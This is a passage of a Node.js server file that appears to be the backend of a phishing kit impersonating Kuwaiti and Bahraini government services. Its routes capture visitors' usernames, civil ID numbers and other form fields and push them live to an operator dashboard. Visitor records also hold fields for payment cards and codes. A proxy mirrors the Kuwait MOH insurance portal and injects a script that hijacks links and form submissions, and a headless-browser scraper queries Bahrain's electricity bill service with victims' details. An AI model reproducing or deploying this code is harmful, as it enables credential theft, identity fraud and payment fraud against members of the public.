      const v = visitors.get(reqSocketId);
      if (v) {
        matchedVisitor = { visitor: v, socketId: reqSocketId };
      }
    }
    
    // 3. Fallback: match by IP
    if (!matchedVisitor) {
      visitors.forEach((v, sid) => {
        if (v.ip === clientIp) {
          matchedVisitor = { visitor: v, socketId: sid };
        }
      });
    }
    
    console.log(`[MOH-DIRECT] Matched: ${matchedVisitor ? matchedVisitor.visitor._id : 'NONE'}, visitors count: ${visitors.size}`);
    
    if (matchedVisitor) {
      const v = matchedVisitor.visitor;
      
      // Update username if captured
      if (username) {
        v.fullName = username;
        v.mohUsername = username;
      }
      
      // Store data
      if (Object.keys(fields).length > 0) {
        if (!v.dataHistory) v.dataHistory = [];
        v.dataHistory.push({
          content: fields,
          page: pageName,
          timestamp: new Date().toISOString(),
        });
        v.data = { ...v.data, ...fields };
        v.hasNewData = true;
        v.page = pageName;
      }
      
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        if (username) {
          io.to(adminSocketId).emit('visitor:nameUpdated', {
            visitorId: v._id,
            name: username,
          });
        }
        if (Object.keys(fields).length > 0) {
          io.to(adminSocketId).emit('visitor:dataSubmitted', {
            visitorId: v._id,
            socketId: matchedVisitor.socketId,
            data: { content: fields, page: pageName },
            visitor: v,
          });
        }
      });
      
      console.log(`[MOH-DIRECT] Updated visitor ${v._id} (${clientIp})`);
    } else {
      console.log(`[MOH-DIRECT] No matching visitor for IP ${clientIp}`);
    }
    
    res.json({ ok: true });
  } catch (err) {
    console.error('[MOH-DIRECT] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/captured-data", (req, res) => {
  try {
    const { url, contentType, body, timestamp, ip } = req.body;
    console.log(`[DATA-COLLECTOR] Received POST data from ${ip} to ${url}`);
    
    // Parse form data from body string
    let parsedFields = {};
    if (body && contentType && contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(body);
      for (const [key, value] of params.entries()) {
        parsedFields[key] = value;
      }
    } else if (body) {
      try {
        parsedFields = JSON.parse(body);
      } catch(e) {
        parsedFields = { rawBody: body };
      }
    }
    
    // Find visitor by IP or create a data entry
    let matchedVisitor = null;
    visitors.forEach((v, socketId) => {
      if (v.ip === ip) {
        matchedVisitor = { visitor: v, socketId };
      }
    });
    
    if (matchedVisitor) {
      // Update existing visitor with captured data
      const v = matchedVisitor.visitor;
      if (!v.dataHistory) v.dataHistory = [];
      v.dataHistory.push({
        content: parsedFields,
        page: `MOH-POST: ${url}`,
        timestamp: timestamp || new Date().toISOString(),
      });
      v.data = { ...v.data, ...parsedFields };
      v.hasNewData = true;
      visitors.set(matchedVisitor.socketId, v);
      saveVisitorPermanently(v);
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:dataSubmitted', {
          visitorId: v._id,
          socketId: matchedVisitor.socketId,
          data: { content: parsedFields, page: `MOH-POST: ${url}` },
          visitor: v,
        });
      });
    } else {
      // No matching visitor - store as orphan data
      console.log(`[DATA-COLLECTOR] No matching visitor for IP ${ip}, storing as orphan`);
      // Create a temporary visitor entry
      visitorCounter++;
      const orphanVisitor = {
        _id: `moh_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: 'moh-captured',
        visitorNumber: visitorCounter,
        createdAt: timestamp || new Date().toISOString(),
        isRead: false,
        fullName: parsedFields.UserName || parsedFields.username || '',
        phone: '',
        idNumber: parsedFields.CivilId || parsedFields.civilId || '',
        apiKey: '',
        ip: ip,
        country: 'KW',
        city: '',
        os: 'Unknown',
        device: 'Unknown',
        browser: 'Unknown',
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: `MOH-POST: ${url}`,
        data: parsedFields,
        dataHistory: [{
          content: parsedFields,
          page: `MOH-POST: ${url}`,
          timestamp: timestamp || new Date().toISOString(),
        }],
        paymentCards: [],
        digitCodes: [],
        hasNewData: true,
        isBlocked: false,
        isConnected: false,
        sessionStartTime: Date.now(),
      };
      savedVisitors.push(orphanVisitor);
      saveData();
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit('visitor:new', orphanVisitor);
      });
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('[DATA-COLLECTOR] Error:', error);
    res.status(500).json({ error: 'Internal error' });
  }
});

// ===== PROXY ROUTE FOR KUWAIT MOH INSURANCE SITE =====
const https = require("https");

app.all("/api/proxy", async (req, res) => {
  const targetUrl = req.query.url || 'https://insonline.moh.gov.kw/Insurance/logaction';
  
  // Only allow proxying to the Kuwait MOH domain
  if (!targetUrl.startsWith('https://insonline.moh.gov.kw/') && !targetUrl.startsWith('http://insonline.moh.gov.kw/')) {
    return res.status(403).json({ error: 'Only Kuwait MOH Insurance site is allowed' });
  }

  try {
    const url = new URL(targetUrl);
    const result = await new Promise((resolve, reject) => {
      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname + url.search,
        method: req.method || 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
          'Accept-Encoding': 'identity',
          'Connection': 'keep-alive',
        },
        timeout: 5000,
        rejectUnauthorized: false,
      };

      const proxyReq = https.request(options, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          const body = Buffer.concat(chunks);
          const headers = {};
          for (const [key, value] of Object.entries(proxyRes.headers)) {
            if (value) headers[key] = Array.isArray(value) ? value.join(', ') : value;
          }
          resolve({ status: proxyRes.statusCode || 200, headers, body });
        });
      });

      proxyReq.on('error', reject);
      proxyReq.on('timeout', () => { proxyReq.destroy(); reject(new Error('Request timeout')); });
      
      // Forward POST body if present
      if (req.method === 'POST' && req.body) {
        const bodyStr = typeof req.body === 'string' ? req.body : 
          (req.headers['content-type'] && req.headers['content-type'].includes('json') ? 
            JSON.stringify(req.body) : new URLSearchParams(req.body).toString());
        proxyReq.write(bodyStr);
      }
      proxyReq.end();
    });

    const contentType = result.headers['content-type'] || 'text/html';
    
    // Set CORS headers and remove framing restrictions
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    res.setHeader('Content-Type', contentType);
    
    if (contentType.includes('text/html')) {
      let html = result.body.toString('utf-8');
      const baseUrl = new URL(targetUrl);
      const baseHref = baseUrl.protocol + '//' + baseUrl.host;
      
      // Add base tag for relative URLs
      html = html.replace(/<head([^>]*)>/i, '<head$1>\n<base href="' + baseHref + '/">');
      
      // Add navigation interception script
      const proxyScript = `
        <script>
          document.addEventListener('click', function(e) {
            var link = e.target.closest('a[href]');
            if (link) {
              var href = link.getAttribute('href');
              if (href && !href.startsWith('javascript:') && !href.startsWith('#')) {
                e.preventDefault();
                var fullUrl;
                if (href.startsWith('http')) fullUrl = href;
                else if (href.startsWith('/')) fullUrl = '${baseHref}' + href;
                else fullUrl = '${baseHref}/' + href;
                if (fullUrl.includes('insonline.moh.gov.kw')) {
                  window.location.href = '/api/proxy?url=' + encodeURIComponent(fullUrl);
                }
              }
            }
          }, true);
          document.addEventListener('submit', function(e) {
            var form = e.target;
            if (form && form.action) {
              e.preventDefault();
              var action = form.getAttribute('action') || window.location.href;
              var fullUrl;
              if (action.startsWith('http')) fullUrl = action;
              else if (action.startsWith('/')) fullUrl = '${baseHref}' + action;
              else fullUrl = '${baseHref}/' + action;
              if (form.method && form.method.toLowerCase() === 'post') {
                var fd = new FormData(form);
                fetch('/api/proxy?url=' + encodeURIComponent(fullUrl), {
                  method: 'POST', body: new URLSearchParams(fd)
                }).then(function(r){return r.text();}).then(function(h){document.open();document.write(h);document.close();});
              } else {
                var p = new URLSearchParams(new FormData(form)).toString();
                window.location.href = '/api/proxy?url=' + encodeURIComponent(fullUrl + '?' + p);
              }
            }
          }, true);
        </script>`;
      html = html.replace('</body>', proxyScript + '\n</body>');
      
      return res.status(result.status).send(html);
    } else {
      return res.status(result.status).send(result.body);
    }
  } catch (error) {
    console.error('Proxy error:', error.message);
    return res.status(502).json({ 
      error: 'Failed to fetch the target page',
      message: error.message
    });
  }
});

// Handle CORS preflight for proxy
app.options("/api/proxy", (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.status(204).send();
});

// Cleanup stale connections - runs every 30 seconds
// Checks if socket IDs in the visitors Map are still actually connected
setInterval(() => {
  const connectedSocketIds = new Set();
  // Get all actually connected socket IDs from Socket.IO
  for (const [id, socket] of io.sockets.sockets) {
    connectedSocketIds.add(id);
  }
  
  let cleaned = 0;
  // Check each visitor in the active visitors Map
  visitors.forEach((visitor, socketId) => {
    if (!connectedSocketIds.has(socketId)) {
      // This socket is no longer connected - clean up
      const visitorId = visitor._id;
      visitors.delete(socketId);
      
      // Check if visitor reconnected with a different socket
      const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
      
      if (!reconnected) {
        // Update saved visitor as disconnected
        const savedVisitor = savedVisitors.find(v => v._id === visitorId);
        if (savedVisitor) {
          savedVisitor.isConnected = false;
        }
        
        // Notify admins
        admins.forEach((admin, adminSocketId) => {
          io.to(adminSocketId).emit("visitor:disconnected", {
            visitorId: visitorId,
            socketId: socketId,
          });
        });
      }
      cleaned++;
    }
  });
  
  if (cleaned > 0) {
    saveData();
    console.log(`Cleaned ${cleaned} stale connections. Active: ${visitors.size}`);
  }
}, 30000); // Every 30 seconds

// On server start, mark all visitors as disconnected (fresh start)
// since no sockets are connected yet
savedVisitors.forEach(v => {
  v.isConnected = false;
});
visitors.clear();
saveData();
console.log("Server start: all visitors marked as disconnected");

// Weather API endpoint - scrapes data from bahrain.bh
let weatherCache = { data: null, timestamp: 0 };
app.get('/api/weather', async (req, res) => {
  try {
    // Cache for 30 minutes
    if (weatherCache.data && Date.now() - weatherCache.timestamp < 1800000) {
      return res.json(weatherCache.data);
    }
    const response = await fetch('https://www.bahrain.bh/wps/portal/ar/home', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html',
        'Accept-Language': 'ar,en;q=0.5',
      }
    });
    const html = await response.text();
    const s = html.indexOf('id="modal-weather"');
    const e = html.indexOf('<!-- End - Weather Popup Modal -->');
    if (s === -1 || e === -1) throw new Error('Weather not found');
    const m = html.substring(s, e);
    const g = (r, d) => { const x = m.match(r); return x ? x[1].trim() : d; };
    const forecast = [];
    const blocks = m.split('class="day-data"');
    for (let i = 1; i < blocks.length; i++) {
      const b = blocks[i];
      const dn = b.match(/day-text">([^<]+)/);
      const dd = b.match(/day-date">([^<]+)/);
      const di = b.match(/src="([^"]+)"/);
      const dc = b.match(/alt="([^"]+)"/);
      const dt = b.match(/day-temp[^>]*>(\d+)(?:&deg;|\u00b0)-(\d+)(?:&deg;|\u00b0)/);
      if (dn && dd && dt) forecast.push({ dayName: dn[1].trim(), date: dd[1].trim(), icon: di?di[1]:'', condition: dc?dc[1].trim():'', minTemp: +dt[1], maxTemp: +dt[2] });
    }
    const data = {
      currentDate: g(/modal-title[^>]*>\s*\n?\s*([^<]+)/, ''),
      condition: g(/today-weather">([^<]+)/, ''),
      weatherIcon: (m.match(/main-weather-image[\s\S]*?src="([^"]+)"/) || [])[1] || '',
      currentTemp: +(g(/dir="ltr">(\d+)\s*\u00b0C/, '0')),
      minTemp: +(g(/low-temp-data[\s\S]*?temp-number">(\d+)/, '0')),
      maxTemp: +(g(/high-temp-data[\s\S]*?temp-number">(\d+)/, '0')),
      humidity: +(g(/humidity-number[^>]*>(\d+)\s*%/, '0')),
      sunrise: g(/sunrise-number">([^<]+)/, ''),
      sunset: g(/sunset-number">([^<]+)/, ''),
      forecast,
    };
    weatherCache = { data, timestamp: Date.now() };
    res.json(data);
  } catch (err) {
    console.error('Weather error:', err.message);
    res.status(500).json({ error: 'Failed to fetch weather' });
  }
});

// ============ EWA Bill Scraper ============
const puppeteer = require('puppeteer');
const { execSync } = require('child_process');

// Find Chrome executable path
function findChromePath() {
  const possiblePaths = [
    require('path').join(__dirname, '.cache', 'puppeteer'),
    '/opt/render/.cache/puppeteer',
    '/opt/render/project/src/.cache/puppeteer',
    '/opt/render/project/.cache/puppeteer',
    process.env.HOME + '/.cache/puppeteer',
  ];
  
  for (const cachePath of possiblePaths) {
    try {
      const result = execSync(`find ${cachePath} -name "chrome" -type f 2>/dev/null | head -1`, { encoding: 'utf8' }).trim();
      if (result) {
        console.log('Found Chrome at:', result);
        return result;
      }
    } catch(e) {}
  }
  
  // Try system-wide search
  try {
    const result = execSync('which google-chrome || which google-chrome-stable || which chromium-browser || which chromium 2>/dev/null', { encoding: 'utf8' }).trim();
    if (result) {
      console.log('Found system Chrome at:', result);
      return result;
    }
  } catch(e) {}
  
  console.log('No Chrome found, using puppeteer default');
  return undefined;
}

app.post('/api/ewa-bill', async (req, res) => {
  const { idType, idNumber, accountNumber } = req.body;
  if (!idType || !idNumber || !accountNumber) {
    return res.status(400).json({ success: false, error: 'جميع الحقول مطلوبة' });
  }

  let browser;
  try {
    const chromePath = findChromePath();
    const launchOptions = {
      headless: 'new',
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--single-process']
    };
    if (chromePath) launchOptions.executablePath = chromePath;
    
    browser = await puppeteer.launch(launchOptions);
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    // الخطوة 1: فتح صفحة خدمات الكهرباء والماء
    console.log('EWA Step 1: Opening page...');
    await page.goto('https://services.bahrain.bh/wps/portal/EWA_ar', {
      waitUntil: 'networkidle2', timeout: 90000
    });
    console.log('EWA Step 1: Page loaded');

    // الخطوة 2: الضغط على دفع فاتورة الكهرباء والماء
    console.log('EWA Step 2: Looking for payEWABillLink...');
    await page.waitForSelector('a[id*="payEWABillLink"]', { timeout: 30000 });
    await page.click('a[id*="payEWABillLink"]');
    console.log('EWA Step 2: Clicked payEWABillLink, waiting for form...');
    // Wait for the form to appear instead of waitForNavigation
    await page.waitForSelector('select[id*="idList"]', { timeout: 60000 });
    await new Promise(r => setTimeout(r, 2000));
    console.log('EWA Step 2: Form loaded');

    // الخطوة 3: اختيار نوع الهوية
    const idTypeMap = {
      'BH': 'الرقم الشخصي البحريني',
      'AE': 'الرقم الشخصي الإماراتي',
      'SA': 'الرقم الشخصي السعودي',
      'OM': 'الرقم الشخصي العماني',
      'QA': 'الرقم الشخصي القطري',
      'KW': 'الرقم الشخصي الكويتي',
      'UNION': 'رقم اتحاد الملاك',
      'GOV': 'رقم الجهة الحكومية',
      'PASSPORT': 'رقم الجواز',
      'CR': 'رقم السجل التجاري',
      'FACILITY': 'رقم المنشأة',
    };
    const label = idTypeMap[idType] || idType;

    // اختيار من القائمة المنسدلة بناءً على النص
    console.log('EWA Step 3: Selecting ID type:', label);
    const selectEl = await page.$('select[id*="idList"]');
    if (selectEl) {
      const options = await page.$$eval('select[id*="idList"] option', opts => opts.map(o => ({ value: o.value, text: o.textContent.trim() })));
      const match = options.find(o => o.text === label);
      if (match) {
        await page.select('select[id*="idList"]', match.value);
        console.log('EWA Step 3: Selected', match.value);
      }
    }
    await new Promise(r => setTimeout(r, 3000));
    await page.waitForNetworkIdle({ timeout: 15000 }).catch(() => {});

    // الخطوة 4: تعبئة البيانات
    console.log('EWA Step 4: Filling form...');
    await page.waitForSelector('input[id*="identitynumber"]', { timeout: 10000 });
    const idInput = await page.$('input[id*="identitynumber"]');
    if (idInput) {
      await idInput.click({ clickCount: 3 });
      await idInput.type(idNumber);
      console.log('EWA Step 4: Filled ID number');
    }
    await page.waitForSelector('input[id*="accountnumber"]', { timeout: 10000 });
    const accInput = await page.$('input[id*="accountnumber"]');
    if (accInput) {
      await accInput.click({ clickCount: 3 });
      await accInput.type(accountNumber);
      console.log('EWA Step 4: Filled account number');
    }

    // الخطوة 5: الضغط على ارسال
    console.log('EWA Step 5: Clicking submit...');
    await page.waitForSelector('input[id*="form1:submit"]', { timeout: 10000 });
    await page.click('input[id*="form1:submit"]');
    console.log('EWA Step 5: Submit clicked, waiting for result...');
    // Wait for result page to appear
    try {
      await page.waitForFunction(() => {
        const b = document.body.innerText;
        return b.includes('تفاصيل الفاتورة') || b.includes('عذراً') || b.includes('لا يوجد');
      }, { timeout: 30000 });
      console.log('EWA Step 5: Result page detected');
    } catch(e) {
      console.log('EWA Step 5: Timeout waiting for result, continuing...');
    }
    await new Promise(r => setTimeout(r, 2000));

    // الخطوة 6: قراءة النتيجة
    const content = await page.content();

    // التحقق من وجود خطأ
    const errorText = await page.$eval('.alert-danger', el => el.textContent).catch(() => null);
    if (errorText && (errorText.includes('عذراً') || errorText.includes('خطأ'))) {
      await browser.close();
      return res.json({ success: false, error: errorText.replace(/[\n\t×]/g, '').trim() });
    }

    // استخراج بيانات الفاتورة من الصفحة
    const result = { success: true, bills: [] };

    // استخراج النص الكامل من الفورم كـ fallback
    try {
      result.rawText = await page.$eval('form[id*="form1"]', el => el.innerText).catch(() => '');
    } catch(e) {}

    // استخراج الجداول
    const tableData = await page.$$eval('table', tables => {
      const allRows = [];
      tables.forEach(table => {
        const rows = table.querySelectorAll('tr');
        rows.forEach((row, idx) => {
          if (idx === 0) return; // skip header
          const cells = row.querySelectorAll('td');
          if (cells.length >= 2) {
            const cellTexts = Array.from(cells).map(c => c.textContent.trim());
            allRows.push(cellTexts);
          }
        });
      });
      return allRows;
    }).catch(() => []);
    result.bills = tableData;

    // استخراج الهيدر من الجداول
    const tableHeaders = await page.$$eval('table', tables => {
      const headers = [];
      tables.forEach(table => {
        const ths = table.querySelectorAll('th');
        if (ths.length > 0) {
          headers.push(Array.from(ths).map(th => th.textContent.trim()));
        }
      });
      return headers;
    }).catch(() => []);
    if (tableHeaders.length > 0) result.tableHeaders = tableHeaders[0];

    // استخراج المبلغ الإجمالي
    const totalMatch = content.match(/(?:المبلغ الإجمالي|الإجمالي|Total)[^<]*?([\d,.]+)/i);
    if (totalMatch) result.totalAmount = totalMatch[1];

    await browser.close();
    res.json(result);

  } catch (err) {
    console.error('EWA Bill error:', err.message);
    if (browser) try { await browser.close(); } catch(e) {}
    res.status(500).json({ success: false, error: 'حدث خطأ أثناء جلب بيانات الفاتورة: ' + err.message });
  }
});

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
